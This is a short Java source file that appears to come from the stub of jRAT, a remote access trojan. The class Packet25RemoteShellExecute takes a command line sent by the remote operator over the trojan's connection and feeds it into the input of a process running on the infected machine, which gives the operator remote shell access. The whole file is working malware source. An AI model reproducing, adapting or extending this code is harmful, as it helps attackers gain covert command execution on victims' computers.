package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.LaunchProcess;

import java.io.PrintWriter;


public class Packet25RemoteShellExecute extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String line = con.readLine();
		
		PrintWriter input = new PrintWriter(LaunchProcess.getLatest().getProcess().getOutputStream(), true);
		input.println(line);
	}

}
